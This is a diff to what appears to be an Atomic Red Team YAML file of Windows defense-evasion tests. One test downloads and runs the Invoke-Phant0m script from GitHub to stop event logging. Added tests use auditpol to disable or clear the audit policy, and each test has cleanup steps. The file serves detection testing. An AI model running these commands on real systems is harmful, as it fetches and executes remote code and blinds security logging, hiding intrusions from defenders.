@@ -6,6 +6,8 @@ atomic_tests:
   description: |
     Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).
     This action requires HTTP logging configurations in IIS to be unlocked.
+
+    Use the cleanup commands to restore some default auditpol settings (your original settings will be lost)
   supported_platforms:
   - windows
   input_arguments:
@@ -27,7 +29,7 @@ atomic_tests:
   supported_platforms:
   - windows
   executor:
-    command: |-
+    command: |
       Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
       $url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
       $output = "$env:TEMP\Invoke-Phant0m.ps1"
@@ -36,7 +38,44 @@ atomic_tests:
       cd $env:TEMP
       Import-Module .\Invoke-Phant0m.ps1
       Invoke-Phant0m
-    cleanup_command: |-
+    cleanup_command: |
       Write-Host "NEED TO Restart-Computer TO ENSURE LOGGING RETURNS" -fore red
+      Remove-Item "$env:TEMP\Invoke-Phant0m.ps1" -ErrorAction Ignore
     name: powershell
+    elevation_required: true
+- name: 'Impair Windows Audit Log Policy'
+  auto_generated_guid: 5102a3a7-e2d7-4129-9e45-f483f2e0eea8
+  description: >-
+    Disables the windows audit policy to prevent key host based telemetry being
+    written into the event logs.
+    
+    [Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)
+  supported_platforms:
+    - windows
+  executor:
+    command: |
+      auditpol /set /category:"Account Logon" /success:disable /failure:disable
+      auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
+      auditpol /set /category:"Detailed Tracking" /success:disable
+    cleanup_command: |
+      auditpol /set /category:"Account Logon" /success:enable /failure:enable
+      auditpol /set /category:"Detailed Tracking" /success:enable
+      auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
+    name: command_prompt
+    elevation_required: true
+- name: 'Clear Windows Audit Policy Config'
+  auto_generated_guid: 913c0e4e-4b37-4b78-ad0b-90e7b25010f6
+  description: >-
+    Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.
+  supported_platforms:
+    - windows
+  executor:
+    command: |
+      auditpol /clear /y
+      auditpol /remove /allusers
+    cleanup_command: |
+      auditpol /set /category:"Account Logon" /success:enable /failure:enable
+      auditpol /set /category:"Detailed Tracking" /success:enable
+      auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
+    name: command_prompt
     elevation_required: true
